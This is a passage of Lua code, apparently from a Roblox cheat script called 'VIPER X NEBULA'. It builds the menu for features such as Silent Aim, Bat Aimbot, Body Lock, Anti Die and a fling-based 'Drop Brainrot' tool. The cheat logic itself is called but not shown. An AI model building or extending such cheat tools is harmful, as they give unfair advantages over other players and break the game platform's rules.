        smoothStealSpeedBox = spdBox

        local pill, knob = mkPill(rightContainer, 0)
        local on = CONFIG.SMOOTH_STEAL_ENABLED or false
        animPill(pill, knob, on, false)

        smoothStealSetVisual = function(state)
            on = state
            CONFIG.SMOOTH_STEAL_ENABLED = state
            animPill(pill, knob, state, true)
            if _G.__ViperApplySpeedNow then pcall(_G.__ViperApplySpeedNow) end
        end

        local clk = Instance.new("TextButton", pill)
        clk.Size = UDim2.new(1, 0, 1, 0)
        clk.BackgroundTransparency = 1
        clk.Text = ""
        clk.AutoButtonColor = false
        clk.ZIndex = 15
        clk.MouseButton1Click:Connect(function()
            on = not on
            smoothStealSetVisual(on)
            task.defer(function() pcall(saveAllSettings) end)
        end)
    end

    -- Current Mode selector / toggle
    do
        local row = mkRow(speedPage, 42)
        mkLabel(row, "Current Mode")
        modeValLbl = Instance.new("TextLabel", row)
        modeValLbl.Size = UDim2.new(0, 110, 1, 0)
        modeValLbl.Position = UDim2.new(1, -118, 0, 0)
        modeValLbl.BackgroundTransparency = 1
        modeValLbl.Text = "Normal"
        modeValLbl.TextColor3 = WHITE
        modeValLbl.Font = Enum.Font.GothamBold
        modeValLbl.TextSize = 12
        modeValLbl.TextXAlignment = Enum.TextXAlignment.Right
        modeValLbl.ZIndex = 8
        local clk = Instance.new("TextButton", row)
        clk.Size = UDim2.new(1,0,1,0)
        clk.BackgroundTransparency = 1
        clk.Text = ""
        clk.AutoButtonColor = false
        clk.ZIndex = 8
        clk.MouseButton1Click:Connect(function() toggleCarryMode() end)
    end

    -- Auto Left & Auto Right
    autoLeftSetVisual = mkToggle(speedPage, "Auto Left", function(on)
        autoLeftEnabled = on
        if on then startAutoLeft() else stopAutoLeft() end
        if mobSetAutoLeft then mobSetAutoLeft(on) end
    end)
    autoRightSetVisual = mkToggle(speedPage, "Auto Right", function(on)
        autoRightEnabled = on
        if on then startAutoRight() else stopAutoRight() end
        if mobSetAutoRight then mobSetAutoRight(on) end
    end)

    local combatPage = contentPages["Combat"]

    mkSect(combatPage, "Defense")
    setAntiBatVisual = mkToggle(combatPage, "Anti Bat", function(on)
        if on then startAntiBat() else stopAntiBat() end
    end)
    setAntiFlingVisual = mkToggle(combatPage, "Anti Fling", function(on)
        antiFlingEnabled = on
        if on then startAntiFling() else stopAntiFling() end
        saveAllSettings()
    end)
    if setAntiFlingVisual then setAntiFlingVisual(antiFlingEnabled) end
    setAntiRagVisual = mkToggle(combatPage, "Anti Ragdoll", function(on)
        if on then startAntiRagdollV2(); antiRagdollMode = "v2" else stopAntiRagdollV2(); antiRagdollMode = "off" end
        saveAllSettings()
    end)
    if setAntiRagVisual then setAntiRagVisual(antiRagdollMode == "v2") end

    setAntiDieVisual = mkToggle(combatPage, "Anti Die", function(on)
        antiDieEnabled = on
        if on then AntiDieModule.start() else AntiDieModule.stop() end
        saveAllSettings()
    end)
    if setAntiDieVisual then setAntiDieVisual(antiDieEnabled) end

    setUnwalkVisual = mkToggle(contentPages["Visual"], "Unwalk", function(on)
        unwalkEnabled = on
        if on then startUnwalk() else stopUnwalk() end
    end)

    mkSect(combatPage, "Attack")
    autoBatSetVisual = mkToggle(combatPage, "Bat Aimbot", function(on)
        if on then enableAutoBat() else disableAutoBat() end
        if mobSetAutoBat then mobSetAutoBat(on) end
    end)
    do
        local modeRow = mkRow(combatPage, 40)
        mkLabel(modeRow, "Aimbot Mode")
        aimbotModeBtnRef = mkSelector(modeRow, selectedAimbotMode or "V1", {"V1", "V2"}, function(dir, updateLabel)
            local modes = {"V1", "V2"}
            local idx = (selectedAimbotMode == "V2") and 2 or 1
            idx = idx + dir
            if idx < 1 then idx = #modes elseif idx > #modes then idx = 1 end
            selectedAimbotMode = modes[idx]
            updateLabel(selectedAimbotMode)
            task.defer(function() pcall(saveAllSettings) end)
        end)
    end
    setMirrorTPV2Visual = mkToggle(combatPage, "Mirror TP Down V2", function(on)
        setMirrorTPDownV2(on)
        saveAllSettings()
    end)
    if setMirrorTPV2Visual then setMirrorTPV2Visual(mirrorTPDownV2Enabled) end

    local silentAimSubPanel = Instance.new("Frame", combatPage)
    silentAimSubPanel.Name = "SilentAimSubPanel"
    silentAimSubPanel.Size = UDim2.new(1, -4, 0, 0)
    silentAimSubPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
    silentAimSubPanel.BackgroundTransparency = 0.3
    silentAimSubPanel.BorderSizePixel = 0
    silentAimSubPanel.ClipsDescendants = true
    Instance.new("UICorner", silentAimSubPanel).CornerRadius = UDim.new(0, 8)
    local saSubLayout = Instance.new("UIListLayout", silentAimSubPanel)
    saSubLayout.SortOrder = Enum.SortOrder.LayoutOrder
    saSubLayout.Padding = UDim.new(0, 4)
    local saSubPad = Instance.new("UIPadding", silentAimSubPanel)
    saSubPad.PaddingLeft = UDim.new(0, 8); saSubPad.PaddingRight = UDim.new(0, 8)
    saSubPad.PaddingTop = UDim.new(0, 4); saSubPad.PaddingBottom = UDim.new(0, 4)
    local function onSilentAimExpand(isOpen)
        TS:Create(silentAimSubPanel, TweenInfo.new(0.30, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = UDim2.new(1, -4, 0, isOpen and 44 or 0)
        }):Play()
    end
    setSilentAimVisual = mkToggle(combatPage, "Silent Aim", function(on)
        if on then startSilentAim() else stopSilentAim() end
        task.defer(function() pcall(saveAllSettings) end)
    end, onSilentAimExpand)
    if setSilentAimVisual then setSilentAimVisual(silentAimEnabled) end
    silentAimSubPanel.LayoutOrder = getNextOrder(combatPage)
    local saRangeRow = mkRow(silentAimSubPanel, 36)
    mkLabel(saRangeRow, "Mesafe (Stud)")
    silentAimRangeBox = mkBox(saRangeRow, silentAimStudRange or 15, 50, 56, function(v)
        if v and v > 0 and v <= 500 then
            silentAimStudRange = v
            if silentAimRangeBox then silentAimRangeBox.Text = tostring(v) end
            task.defer(function() pcall(saveAllSettings) end)
        end
    end)
    local ragdollAimbotSubPanel = Instance.new("Frame", combatPage)

    mkSect(combatPage, "Targeting")
    do
        -- Body Lock: toggle first (gets lower LayoutOrder), sub-panel after (higher order = below)
        local blSubPanel = Instance.new("Frame", combatPage)
        blSubPanel.Name = "BodyLockSubPanel"
        blSubPanel.Size = UDim2.new(1, -4, 0, 0)
        blSubPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
        blSubPanel.BackgroundTransparency = 0.3
        blSubPanel.BorderSizePixel = 0
        blSubPanel.ClipsDescendants = true
        Instance.new("UICorner", blSubPanel).CornerRadius = UDim.new(0, 8)
        local blSubLayout = Instance.new("UIListLayout", blSubPanel)
        blSubLayout.SortOrder = Enum.SortOrder.LayoutOrder
        blSubLayout.Padding = UDim.new(0, 4)
        local blSubPad = Instance.new("UIPadding", blSubPanel)
        blSubPad.PaddingLeft = UDim.new(0, 8)
        blSubPad.PaddingRight = UDim.new(0, 8)
        blSubPad.PaddingTop = UDim.new(0, 4)
        blSubPad.PaddingBottom = UDim.new(0, 4)

        local function onBLExpand(isOpen)
            TS:Create(blSubPanel, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(1, -4, 0, isOpen and 52 or 0)
            }):Play()
        end

        -- Toggle first → gets lower LayoutOrder (appears above sub-panel)
        bodyLockSetVisual = mkToggle(combatPage, "Body Lock", function(on)
            bodyLockEnabled = on
            if on then
                if _blSuppressCount == 0 then startBodyLock() end
            else
                stopBodyLock()
            end
        end, onBLExpand)

        -- Sub-panel assigned order AFTER toggle row → appears below
        blSubPanel.LayoutOrder = getNextOrder(combatPage)

        -- Range row inside sub-panel
        local rangeRow = mkRow(blSubPanel, 38)
        mkLabel(rangeRow, "Body Lock Range")
        bodyLockRangeBox = mkBox(rangeRow, bodyLockRange, 50, 56, function(v)
            if v and v > 0 then
                bodyLockRange = _clamp(_floor(v), 5, 200)
                if bodyLockRangeBox then bodyLockRangeBox.Text = tostring(bodyLockRange) end
                task.defer(function() pcall(saveAllSettings) end)
            end
        end)
    end

    mkSect(combatPage, "Counters")
    do
        -- Sub-panel (hidden, opens below header row)
        local bcSubPanel = Instance.new("Frame", combatPage)
        bcSubPanel.Name = "BatCounterSubPanel"
        bcSubPanel.Size = UDim2.new(1, -4, 0, 0)
        bcSubPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
        bcSubPanel.BackgroundTransparency = 0.3
        bcSubPanel.BorderSizePixel = 0
        bcSubPanel.ClipsDescendants = true
        Instance.new("UICorner", bcSubPanel).CornerRadius = UDim.new(0, 8)
        local bcSubLayout = Instance.new("UIListLayout", bcSubPanel)
        bcSubLayout.SortOrder = Enum.SortOrder.LayoutOrder
        bcSubLayout.Padding = UDim.new(0, 4)
        local bcPad = Instance.new("UIPadding", bcSubPanel)
        bcPad.PaddingLeft = UDim.new(0, 8); bcPad.PaddingRight = UDim.new(0, 8)
        bcPad.PaddingTop = UDim.new(0, 4); bcPad.PaddingBottom = UDim.new(0, 4)

        local bcOpen = false
        local function toggleBCPanel()
            bcOpen = not bcOpen
            TS:Create(bcSubPanel, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(1, -4, 0, bcOpen and 96 or 0)
            }):Play()
            -- Update arrow text
            local headerRow = combatPage:FindFirstChild("BatCounterHeader")
            if headerRow then
                local arrow = headerRow:FindFirstChild("BCArrow")
                if arrow then arrow.Text = bcOpen and "▼" or "▶" end
            end
        end

        -- Header row: just label + arrow (NO pill toggle)
        local bcHeaderRow = mkRow(combatPage, 42)
        bcHeaderRow.Name = "BatCounterHeader"
        local bcLabel = Instance.new("TextLabel", bcHeaderRow)
        bcLabel.Size = UDim2.new(0.7, 0, 1, 0)
        bcLabel.Position = UDim2.new(0, 12, 0, 0)
        bcLabel.BackgroundTransparency = 1
        bcLabel.Text = "Bat Counter"
        bcLabel.TextColor3 = Color3.fromRGB(240, 240, 250)
        bcLabel.Font = Enum.Font.GothamBold
        bcLabel.TextSize = 14
        bcLabel.TextXAlignment = Enum.TextXAlignment.Left
        bcLabel.ZIndex = 8

        local bcArrow = Instance.new("TextButton", bcHeaderRow)
        bcArrow.Name = "BCArrow"
        bcArrow.AnchorPoint = Vector2.new(1, 0.5)
        bcArrow.Position = UDim2.new(1, -12, 0.5, 0)
        bcArrow.Size = UDim2.new(0, 28, 0, 28)
        bcArrow.BackgroundColor3 = Color3.fromRGB(20, 22, 28)
        bcArrow.BackgroundTransparency = 0.2
        bcArrow.BorderSizePixel = 0
        bcArrow.Text = "▶"
        bcArrow.TextColor3 = getThemeColor()
        bcArrow.Font = Enum.Font.GothamBlack
        bcArrow.TextSize = 11
        bcArrow.AutoButtonColor = false
        bcArrow.ZIndex = 14
        Instance.new("UICorner", bcArrow).CornerRadius = UDim.new(0, 7)
        local bcArrowStroke = Instance.new("UIStroke", bcArrow)
        bcArrowStroke.Color = getThemeColor()
        bcArrowStroke.Thickness = 1.2
        bcArrowStroke.Transparency = 0.4

        -- Clicking anywhere on the header row toggles the panel
        local bcClickOverlay = Instance.new("TextButton", bcHeaderRow)
        bcClickOverlay.Size = UDim2.new(1, 0, 1, 0)
        bcClickOverlay.BackgroundTransparency = 1
        bcClickOverlay.Text = ""
        bcClickOverlay.AutoButtonColor = false
        bcClickOverlay.ZIndex = 13
        bcClickOverlay.MouseButton1Click:Connect(toggleBCPanel)
        bcArrow.MouseButton1Click:Connect(toggleBCPanel)

        -- Sub-panel order AFTER header row → appears below
        bcSubPanel.LayoutOrder = getNextOrder(combatPage)

        -- V1 (Classic) — mutually exclusive with V2
        setBatCounterVisual = mkToggle(bcSubPanel, "V1  (Classic)", function(on)
            batCounterEnabled = on
            if on then
                -- Turn off V2 if active
                if batCounterV2Enabled then
                    batCounterV2Enabled = false
                    stopBatCounterV2()
                    if setBatCounterV2Visual then setBatCounterV2Visual(false) end
                end
                startBatCounter()
            else
                stopBatCounter()
            end
        end)

        -- V2 (Improved) — mutually exclusive with V1
        setBatCounterV2Visual = mkToggle(bcSubPanel, "V2  (Improved)", function(on)
            batCounterV2Enabled = on
            if on then
                -- Turn off V1 if active
                if batCounterEnabled then
                    batCounterEnabled = false
                    stopBatCounter()
                    if setBatCounterVisual then setBatCounterVisual(false) end
                end
                startBatCounterV2()
            else
                stopBatCounterV2()
            end
        end)
    end
    setMedusaVisual = mkToggle(combatPage, "Medusa Counter", function(on)
        medusaCounterEnabled = on
        if on then
            if LP.Character then setupMedusaCounter(LP.Character) else stopMedusaCounter() end
        else
            stopMedusaCounter()
        end
        if setMedusaVisual then setMedusaVisual(on) end
    end)

    local autoMedusaSubPanel = Instance.new("Frame", combatPage)
    autoMedusaSubPanel.Name = "AutoMedusaSubPanel"
    autoMedusaSubPanel.Size = UDim2.new(1, -4, 0, 0)
    autoMedusaSubPanel.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
    autoMedusaSubPanel.BackgroundTransparency = 0.3
    autoMedusaSubPanel.BorderSizePixel = 0
    autoMedusaSubPanel.ClipsDescendants = true
    Instance.new("UICorner", autoMedusaSubPanel).CornerRadius = UDim.new(0, 8)
    local medSubLayout = Instance.new("UIListLayout", autoMedusaSubPanel)
    medSubLayout.SortOrder = Enum.SortOrder.LayoutOrder
    medSubLayout.Padding = UDim.new(0, 4)
    local medSubPad = Instance.new("UIPadding", autoMedusaSubPanel)
    medSubPad.PaddingLeft = UDim.new(0, 8); medSubPad.PaddingRight = UDim.new(0, 8)
    medSubPad.PaddingTop = UDim.new(0, 4); medSubPad.PaddingBottom = UDim.new(0, 4)
    local function onAutoMedusaExpand(isOpen)
        TS:Create(autoMedusaSubPanel, TweenInfo.new(0.30, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = UDim2.new(1, -4, 0, isOpen and 44 or 0)
        }):Play()
    end
    setMedusaAutoVisual = mkToggle(combatPage, "Auto Medusa", function(on)
        if on then startAutoMedusa() else stopAutoMedusa() end
        task.defer(function() pcall(saveAllSettings) end)
    end, onAutoMedusaExpand)
    if setMedusaAutoVisual then setMedusaAutoVisual(autoMedusaEnabled) end
    autoMedusaSubPanel.LayoutOrder = getNextOrder(combatPage)
    local medRangeRow = mkRow(autoMedusaSubPanel, 36)
    mkLabel(medRangeRow, "Mesafe (Stud)")
    autoMedusaRangeBox = mkBox(medRangeRow, autoMedusaStudRange or 15, 50, 56, function(v)
        if v and v > 0 and v <= 500 then
            autoMedusaStudRange = v
            if autoMedusaRangeBox then autoMedusaRangeBox.Text = tostring(v) end
            task.defer(function() pcall(saveAllSettings) end)
        end
    end)
    mkSect(combatPage, "Drop")

    mkSect(combatPage, "Drop")
    dropBrainrotSetVisual = mkToggle(combatPage, "Drop Brainrot", function(on)
        if on then
            executeDropWithToggle(function(v)
                dropBrainrotSetVisual(v)
                if mobSetDropBR then mobSetDropBR(v) end
            end)
        end
    end)
    setDropVisual = dropBrainrotSetVisual
    do
        local row = mkRow(combatPage, 42)
        mkLabel(row, "Drop Mode")
        dropModeBtnRef = mkSelector(row, dropMode == 1 and "Fling" or "Jump Drop", {"Fling", "Jump Drop"}, function(dir, update)
            if dropActive then stopDropBrainrot() end
            dropMode = dropMode == 1 and 2 or 1
            update(dropMode == 1 and "Fling" or "Jump Drop")
        end)
    end

    local visualPage = contentPages["Visual"]

    mkSect(visualPage, "Interface")
    do
        -- Background picker: a single Click button opens a rounded menu with
        -- direct selection and an opacity slider.
        local row = mkRow(visualPage, 42)
        mkLabel(row, "Background")
        local openPicker = Instance.new("TextButton", row)
        openPicker.Name = "OpenBackgroundPicker"
        openPicker.Size = UDim2.new(0, 100, 0, 28)
        openPicker.Position = UDim2.new(1, -110, 0.5, -14)
        openPicker.BackgroundColor3 = Color3.fromRGB(31, 29, 39)
        openPicker.BackgroundTransparency = 0.05
        openPicker.BorderSizePixel = 0
        openPicker.Text = "Click"
        openPicker.TextColor3 = WHITE
        openPicker.Font = Enum.Font.GothamBold
        openPicker.TextSize = 12
        openPicker.AutoButtonColor = false
        openPicker.ZIndex = 9
        Instance.new("UICorner", openPicker).CornerRadius = UDim.new(0, 8)
        local openStroke = Instance.new("UIStroke", openPicker)
        openStroke.Color = getThemeColor()
        openStroke.Thickness = 1.2
        openStroke.Transparency = 0.18

        local pickerDim = Instance.new("TextButton", gui)
        pickerDim.Name = "BackgroundPickerDim"
        pickerDim.Size = UDim2.fromScale(1, 1)
        pickerDim.Position = UDim2.fromScale(0, 0)
        pickerDim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        pickerDim.BackgroundTransparency = 1
        pickerDim.BorderSizePixel = 0
        pickerDim.Text = ""
        pickerDim.TextTransparency = 1
        pickerDim.AutoButtonColor = false
        pickerDim.Visible = false
        pickerDim.ZIndex = 99

        local picker = Instance.new("Frame")
        picker.Name = "BackgroundPicker"
        picker.AnchorPoint = Vector2.new(0.5, 0.5)
        picker.Position = UDim2.fromScale(0.5, 0.5)
        picker.Size = UDim2.new(0, 450, 0, 390)
        picker.BackgroundColor3 = Color3.fromRGB(17, 17, 23)
        picker.BackgroundTransparency = 0.02
        picker.BorderSizePixel = 0
        picker.Visible = false
        picker.ZIndex = 100
        picker.Parent = gui
        Instance.new("UICorner", picker).CornerRadius = UDim.new(0, 16)
        local pickerStroke = Instance.new("UIStroke", picker)
        pickerStroke.Color = getThemeColor()
        pickerStroke.Thickness = 1.5
        pickerStroke.Transparency = 0.08

        local pickerScale = Instance.new("UIScale", picker)
        pickerScale.Scale = 1
        local pickerTransitioning = false
        local function closeBackgroundPicker()
            if not picker.Visible or pickerTransitioning then return end
            pickerTransitioning = true
            local panelTween = TS:Create(pickerScale, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0.9})
            local fadeTween = TS:Create(picker, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
            local dimTween = TS:Create(pickerDim, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1})
            panelTween.Completed:Connect(function()
                picker.Visible = false
                pickerDim.Visible = false
                pickerScale.Scale = 1
                picker.BackgroundTransparency = 0.02
                pickerTransitioning = false
            end)
            panelTween:Play(); fadeTween:Play(); dimTween:Play()
        end
        local function openBackgroundPicker()
            if pickerTransitioning or picker.Visible then return end
            pickerTransitioning = true
            pickerDim.Visible = true
            pickerDim.BackgroundTransparency = 1
            picker.Visible = true
            pickerScale.Scale = 0.86
            picker.BackgroundTransparency = 1
            TS:Create(pickerScale, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
            TS:Create(pickerDim, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 0.42}):Play()
            local fadeTween = TS:Create(picker, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundTransparency = 0.02})
            fadeTween.Completed:Connect(function() pickerTransitioning = false end)
            fadeTween:Play()
        end
        pickerDim.Activated:Connect(closeBackgroundPicker)

        local pickerTitle = Instance.new("TextLabel", picker)
        pickerTitle.BackgroundTransparency = 1
        pickerTitle.Position = UDim2.new(0, 16, 0, 10)
        pickerTitle.Size = UDim2.new(1, -65, 0, 28)
        pickerTitle.Text = "BACKGROUND SELECTOR"
        pickerTitle.TextColor3 = WHITE
        pickerTitle.Font = Enum.Font.GothamBold
        pickerTitle.TextSize = 13
        pickerTitle.TextXAlignment = Enum.TextXAlignment.Left
        pickerTitle.ZIndex = 101

        local closePicker = Instance.new("TextButton", picker)
        closePicker.Size = UDim2.new(0, 28, 0, 28)
        closePicker.Position = UDim2.new(1, -38, 0, 9)
        closePicker.BackgroundColor3 = Color3.fromRGB(37, 34, 44)
        closePicker.BorderSizePixel = 0
        closePicker.Text = "×"
        closePicker.TextColor3 = WHITE
        closePicker.Font = Enum.Font.GothamBold
        closePicker.TextSize = 18
        closePicker.ZIndex = 102
        Instance.new("UICorner", closePicker).CornerRadius = UDim.new(0, 8)
        closePicker.Activated:Connect(closeBackgroundPicker)

        local selectedLabel = Instance.new("TextLabel", picker)
        selectedLabel.BackgroundTransparency = 1
        selectedLabel.Position = UDim2.new(0, 16, 0, 42)
        selectedLabel.Size = UDim2.new(1, -32, 0, 20)
        selectedLabel.TextColor3 = Color3.fromRGB(190, 190, 204)
        selectedLabel.Font = Enum.Font.Gotham
        selectedLabel.TextSize = 11
        selectedLabel.TextXAlignment = Enum.TextXAlignment.Left
        selectedLabel.ZIndex = 101

        local choiceScroll = Instance.new("ScrollingFrame", picker)
        choiceScroll.Name = "BackgroundChoices"
        choiceScroll.Position = UDim2.new(0, 14, 0, 68)
        choiceScroll.Size = UDim2.new(1, -28, 0, 220)
        choiceScroll.BackgroundColor3 = Color3.fromRGB(11, 11, 16)
        choiceScroll.BackgroundTransparency = 0.12
        choiceScroll.BorderSizePixel = 0
        choiceScroll.ScrollBarThickness = 4
        choiceScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        choiceScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        choiceScroll.ZIndex = 101
        Instance.new("UICorner", choiceScroll).CornerRadius = UDim.new(0, 10)
        local choicePadding = Instance.new("UIPadding", choiceScroll)
        choicePadding.PaddingTop = UDim.new(0, 8)
        choicePadding.PaddingBottom = UDim.new(0, 8)
        choicePadding.PaddingLeft = UDim.new(0, 8)
        choicePadding.PaddingRight = UDim.new(0, 8)
        local choiceLayout = Instance.new("UIGridLayout", choiceScroll)
        choiceLayout.CellSize = UDim2.new(0, 126, 0, 88)
        choiceLayout.CellPadding = UDim2.new(0, 7, 0, 7)
        choiceLayout.SortOrder = Enum.SortOrder.LayoutOrder

        local function refreshPickerLabel()
            selectedLabel.Text = "Selected: " .. backgroundMode .. "    |    Opacity: " .. tostring(math.floor((1 - backgroundImageTransparency) * 100 + 0.5)) .. "%"
        end
        local function selectBackground(mode)
            applyBackgroundMode(mode)
            refreshPickerLabel()
            task.defer(function() saveAllSettings(true) end)
            for _, child in ipairs(choiceScroll:GetChildren()) do
                if child:IsA("ImageButton") or child:IsA("TextButton") then
                    local isSelected = child:GetAttribute("BackgroundMode") == backgroundMode
                    local stroke = child:FindFirstChildOfClass("UIStroke")
                    if stroke then stroke.Color = isSelected and getThemeColor() or Color3.fromRGB(64, 61, 72) end
                    if child:IsA("TextButton") then
                        child.BackgroundColor3 = isSelected and Color3.fromRGB(72, 53, 89) or Color3.fromRGB(31, 29, 39)
                    end
                end
            end
        end
        local function addChoice(label, mode, order)
            local isNone = mode == "None"
            local choice
            if isNone then
                choice = Instance.new("TextButton", choiceScroll)
                choice.Text = "NONE"
                choice.BackgroundColor3 = Color3.fromRGB(31, 29, 39)
                choice.TextColor3 = WHITE
                choice.Font = Enum.Font.GothamBold
                choice.TextSize = 12
            else
                choice = Instance.new("ImageButton", choiceScroll)
                local imageId = tostring(backgroundImages[order - 1] or ""):match("%d+")
                -- Use the actual image/decal ID first; some clients do not render rbxthumb reliably.
                choice.Image = imageId and ("rbxassetid://" .. imageId) or ""
                choice.ScaleType = Enum.ScaleType.Crop
                choice.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
                choice.ImageColor3 = Color3.fromRGB(255, 255, 255)
                choice.ImageTransparency = 0
                choice.ClipsDescendants = true
                local caption = Instance.new("TextLabel", choice)
                caption.Name = "PreviewName"
                caption.Size = UDim2.new(1, 0, 0, 24)
                caption.Position = UDim2.new(0, 0, 1, -24)
                caption.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
                caption.BackgroundTransparency = 0.16
                caption.BorderSizePixel = 0
                caption.Text = label
                caption.TextColor3 = WHITE
                caption.TextStrokeTransparency = 0.55
                caption.Font = Enum.Font.GothamBold
                caption.TextSize = 10
                caption.ZIndex = 104
                -- Try the image content ID first, then Roblox's asset thumbnail.
                -- Use PreloadAsync's fetch status instead of IsLoaded alone so a
                -- failed first URL cannot leave the card stuck as a grey rectangle.
                if imageId then
                    task.spawn(function()
                        local candidates = {
                            "rbxthumb://type=Asset&id=" .. imageId .. "&w=420&h=280",
                            "rbxassetid://" .. imageId,
                        }
                        local loaded = false
                        for _, imageUri in ipairs(candidates) do
                            if not choice.Parent then return end
                            choice.Image = imageUri
                            local fetchStatus = nil
                            local ok = pcall(function()
                                ContentProvider:PreloadAsync({choice}, function(_, status)
                                    fetchStatus = status
                                end)
                            end)
                            if not choice.Parent then return end
                            if ok and (fetchStatus == Enum.AssetFetchStatus.Success or (fetchStatus == nil and choice.IsLoaded)) then
                                loaded = true
                                break
                            end
                            task.wait(0.15)
                        end
                        if not choice.Parent then return end
                        if loaded then
                            choice.BackgroundTransparency = 1
                        else
                            -- Do NOT blank the Image property on a slow/failed preload.
                            -- Leave the last URI assigned so Roblox can finish loading it asynchronously.
                            choice.BackgroundTransparency = 0.08
                            choice.BackgroundColor3 = Color3.fromRGB(39, 31, 48)
                            warn("[VIPER X NEBULA] Background preview is still pending or the asset is unavailable: " .. imageId)
                        end
                    end)
                end
            end
            choice.Name = "Choice_" .. tostring(order)
            choice.LayoutOrder = order
            choice.Size = UDim2.new(0, 126, 0, 88)
            choice.BorderSizePixel = 0
            choice.AutoButtonColor = false
            choice.ZIndex = 102
            choice:SetAttribute("BackgroundMode", mode)
            Instance.new("UICorner", choice).CornerRadius = UDim.new(0, 8)
            local stroke = Instance.new("UIStroke", choice)
            stroke.Color = mode == backgroundMode and getThemeColor() or Color3.fromRGB(64, 61, 72)
            stroke.Thickness = mode == backgroundMode and 2.5 or 1
            stroke.Transparency = mode == backgroundMode and 0 or 0.16
            choice.Activated:Connect(function() selectBackground(mode) end)
        end
        addChoice("None", "None", 1)
        for i = 1, #backgroundImages do
            addChoice("Background " .. tostring(i), "Background " .. tostring(i), i + 1)
        end

        local opacityTitle = Instance.new("TextLabel", picker)
        opacityTitle.BackgroundTransparency = 1
        opacityTitle.Position = UDim2.new(0, 16, 0, 300)
        opacityTitle.Size = UDim2.new(1, -32, 0, 18)
        opacityTitle.Text = "Image opacity"
        opacityTitle.TextColor3 = WHITE
        opacityTitle.Font = Enum.Font.GothamSemibold
        opacityTitle.TextSize = 11
        opacityTitle.TextXAlignment = Enum.TextXAlignment.Left
        opacityTitle.ZIndex = 101

        local opacityValue = Instance.new("TextLabel", picker)
        opacityValue.BackgroundTransparency = 1
        opacityValue.Position = UDim2.new(1, -70, 0, 300)
        opacityValue.Size = UDim2.new(0, 54, 0, 18)
        opacityValue.TextColor3 = Color3.fromRGB(205, 205, 218)
        opacityValue.Font = Enum.Font.GothamBold
        opacityValue.TextSize = 11
        opacityValue.TextXAlignment = Enum.TextXAlignment.Right
        opacityValue.ZIndex = 101

        local slider = Instance.new("Frame", picker)
        slider.Name = "OpacitySlider"
        slider.Position = UDim2.new(0, 16, 0, 327)
        slider.Size = UDim2.new(1, -32, 0, 12)
        slider.BackgroundColor3 = Color3.fromRGB(48, 46, 57)
        slider.BorderSizePixel = 0
        slider.ZIndex = 101
        Instance.new("UICorner", slider).CornerRadius = UDim.new(1, 0)
        local sliderFill = Instance.new("Frame", slider)
        sliderFill.Size = UDim2.new(1 - backgroundImageTransparency, 0, 1, 0)
        sliderFill.BackgroundColor3 = getThemeColor()
        sliderFill.BorderSizePixel = 0
        sliderFill.ZIndex = 102
        Instance.new("UICorner", sliderFill).CornerRadius = UDim.new(1, 0)
        local sliderKnob = Instance.new("Frame", slider)
        sliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
        sliderKnob.Position = UDim2.new(1 - backgroundImageTransparency, 0, 0.5, 0)
        sliderKnob.Size = UDim2.new(0, 16, 0, 16)
        sliderKnob.BackgroundColor3 = WHITE
        sliderKnob.BorderSizePixel = 0
        sliderKnob.ZIndex = 103
        Instance.new("UICorner", sliderKnob).CornerRadius = UDim.new(1, 0)
        local sliding = false
        local function setOpacityFromX(x)
            local width = math.max(slider.AbsoluteSize.X, 1)
            local alpha = math.clamp((x - slider.AbsolutePosition.X) / width, 0, 1)
            -- Slider displays opacity, while Roblox ImageTransparency is inverse.
            backgroundImageTransparency = 1 - alpha
            sliderFill.Size = UDim2.new(alpha, 0, 1, 0)
            sliderKnob.Position = UDim2.new(alpha, 0, 0.5, 0)
            opacityValue.Text = tostring(math.floor(alpha * 100 + 0.5)) .. "%"
            if main then
                local image = main:FindFirstChild("BackgroundImage")
                if image and image:IsA("ImageLabel") then image.ImageTransparency = backgroundMode == "None" and 1 or backgroundImageTransparency end
            end
            refreshPickerLabel()
            task.defer(function() saveAllSettings(true) end)
        end
        slider.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                sliding = true
                setOpacityFromX(input.Position.X)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                setOpacityFromX(input.Position.X)
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if sliding then sliding = false; task.defer(function() saveAllSettings(true) end) end
            end
        end)
        local function syncOpacity()
            local alpha = 1 - math.clamp(tonumber(backgroundImageTransparency) or 0, 0, 1)
            sliderFill.Size = UDim2.new(alpha, 0, 1, 0)
            sliderKnob.Position = UDim2.new(alpha, 0, 0.5, 0)
            opacityValue.Text = tostring(math.floor(alpha * 100 + 0.5)) .. "%"
            refreshPickerLabel()
        end
        openPicker.Activated:Connect(function()
            openBackgroundPicker()
            syncOpacity()
            selectBackground(backgroundMode)
        end)
        backgroundSelectorLabel = selectedLabel
        applyBackgroundMode(backgroundMode)
        refreshPickerLabel()
        syncOpacity()
